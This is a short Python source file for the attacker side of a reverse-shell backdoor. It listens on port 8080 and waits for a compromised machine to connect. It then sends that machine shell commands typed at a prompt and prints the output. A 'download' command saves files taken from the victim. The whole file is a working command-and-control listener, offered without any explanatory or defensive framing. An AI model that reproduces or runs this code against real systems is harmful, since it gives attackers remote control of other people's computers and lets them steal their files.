import socket
import json
import codecs
import base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] start listening on port 8080")
        self.client, addr = listener.accept()
        print(f"got connection from {addr[0]} on port 8080")

    def reliable_send(self, data):
        if data[0] == "exit":
            json_data = json.dumps(data)
            self.client.send(json_data.encode())
            self.client.close()
            exit()
        json_data = json.dumps(data)
        self.client.send(json_data.encode())

    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data += (self.client.recv(1024)).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content.encode()))
            return f"[+] downloaded file {path}"

    def executor(self, command):
        self.reliable_send(command)
        return self.reliable_recv()

    def run(self):
        while True:
            command = input("~#")
            command = command.split(" ")
            result = self.executor(command)
            if command[0] == "download":
                print(self.write_file(command[1], result))
            else:
                try:
                    print(codecs.decode(result, "unicode_escape"))
                except UnicodeDecodeError:
                    print(result)


listener = Listener("ip-address", 8080)
listener.run()
